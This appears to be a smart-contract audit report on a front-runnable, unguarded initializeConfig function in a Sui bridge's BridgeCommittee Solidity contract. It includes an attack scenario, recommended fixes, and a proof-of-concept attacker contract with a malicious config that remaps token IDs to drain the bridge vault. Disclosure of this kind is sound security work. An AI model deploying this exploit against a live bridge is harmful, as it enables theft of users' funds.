### Title
Unguarded `initializeConfig` in `BridgeCommittee` Allows Any Caller to Permanently Inject a Malicious Config, Enabling Bridge Fund Theft — (`bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee.initializeConfig` is an `external` function with no access-control modifier. Its only guard is `require(address(config) == address(0))`. Any unprivileged caller can front-run the deployer's `initializeConfig` call and permanently bind the committee to a malicious `IBridgeConfig` contract. Because `SuiBridge` reads all token-address, chain-ID, and token-support data from `committee.config()`, a malicious config can remap token IDs to attacker-controlled addresses, causing the vault to transfer wrong tokens to bridge users and draining the vault.

---

### Finding Description

`BridgeCommittee.initialize` (the UUPS initializer) is correctly protected by OpenZeppelin's `initializer` modifier and `_disableInitializers()` in the constructor. However, the second initialization step — `initializeConfig` — carries no such protection:

```solidity
// bridge/evm/contracts/BridgeCommittee.sol  lines 63-66
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

The deployment script creates the proxy (calling `initialize`), then deploys `BridgeConfig`, and only then calls `initializeConfig`. Between proxy deployment and the `initializeConfig` call, `config` is `address(0)` and the guard passes for any caller:

```solidity
// bridge/evm/script/deploy_bridge.s.sol  lines 124-178
address bridgeCommittee = Upgrades.deployUUPSProxy("BridgeCommittee.sol", ...);
// ... deploy bridgeConfig ...
BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));   // front-runnable
BridgeCommittee committeeImplementation = ...;
committeeImplementation.initializeConfig(address(bridgeConfig));            // also front-runnable
```

An attacker who calls `initializeConfig(address(maliciousConfig))` before the deployer permanently sets `BridgeCommittee.config` to a contract they control. The deployer's subsequent call reverts with "Config already initialized" and there is no recovery path.

`SuiBridge` reads the config on every critical operation:

```solidity
// bridge/evm/contracts/SuiBridge.sol  lines 67-68, 146-150, 250
IBridgeConfig config = committee.config();
// used for: tokenAddressOf(), tokenSuiDecimalOf(), chainID(), isTokenSupported(), isChainSupported()
```

A malicious config can return arbitrary values for all of these, including remapping `tokenAddressOf(tokenID)` to any ERC20 address held in the vault.

---

### Impact Explanation

**Critical — direct fund theft from the bridge vault.**

Attack scenario:

1. Attacker deploys `MaliciousConfig` that returns `address(attacker_token)` for `tokenAddressOf(USDC_ID)` and returns valid values for all other checks so bridge operations do not revert.
2. Attacker front-runs `initializeConfig` on the proxy; `BridgeCommittee.config` is permanently set to `MaliciousConfig`.
3. Legitimate users bridge USDC from Sui. The Sui committee signs a `TOKEN_TRANSFER` message for `tokenID = USDC_ID`.
4. `SuiBridge.transferBridgedTokensWithSignatures` passes signature verification (committee stake is unaffected), then calls `committee.config().tokenAddressOf(USDC_ID)` → returns `attacker_token`.
5. `vault.transferERC20(attacker_token, recipientAddress, amount)` drains `attacker_token` from the vault instead of USDC.

Additionally, the malicious config can:
- Return `false` for `isTokenSupported()` / `isChainSupported()` → permanent DoS of all bridge operations (permanent fund lock).
- Return a wrong `chainID()` → break chain-ID validation on every transfer.

---

### Likelihood Explanation

**High.** The vulnerability requires only a standard Ethereum transaction submitted before the deployer's `initializeConfig` call. The deployment script shows a clear two-transaction window (proxy deploy → config deploy → `initializeConfig`). Front-running is straightforward on Ethereum mainnet via mempool observation and higher gas. No special privilege, key, or committee membership is required.

---

### Recommendation

Add an access-control check to `initializeConfig`. The simplest fix is to restrict it to the contract's own upgrade authority (the committee) or to the deployer, and to call it atomically inside `initialize`:

```solidity
// Option A: call initializeConfig inside initialize (atomic, no window)
function initialize(
    address[] memory committee,
    uint16[] memory stake,
    uint16 minStakeRequired,
    address _config          // add config here
) external initializer {
    // ... existing setup ...
    config = IBridgeConfig(_config);
}

// Option B: if two-step is required, restrict to a stored admin address
function initializeConfig(address _config) external {
    require(msg.sender == admin, "BridgeCommittee: Not authorized");
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

### Proof of Concept

```solidity
// Attacker contract
contract AttackInitConfig {
    function attack(address committeeProxy, address maliciousConfig) external {
        // Called in the same block as (or before) the deployer's initializeConfig tx
        BridgeCommittee(committeeProxy).initializeConfig(maliciousConfig);
        // BridgeCommittee.config is now permanently set to maliciousConfig
        // Deployer's subsequent initializeConfig call will revert:
        //   "BridgeCommittee: Config already initialized"
    }
}

// MaliciousConfig: returns attacker-chosen token address for any tokenID
contract MaliciousConfig is IBridgeConfig {
    address public attacker;
    address public drainToken; // e.g. WBTC address held in vault

    function tokenAddressOf(uint8) external view returns (address) {
        return drainToken; // all tokenIDs map to drainToken
    }
    function isTokenSupported(uint8) external pure returns (bool) { return true; }
    function isChainSupported(uint8) external pure returns (bool) { return true; }
    function chainID() external pure returns (uint8) { return 12; } // match expected chain
    // ... other IBridgeConfig methods return benign values ...
}
```

After the attack:
- Every `SuiBridge.transferBridgedTokensWithSignatures` call (with valid committee signatures) transfers `drainToken` from the vault instead of the intended token.
- The vault is drained of `drainToken` proportional to the volume of legitimate bridge traffic.
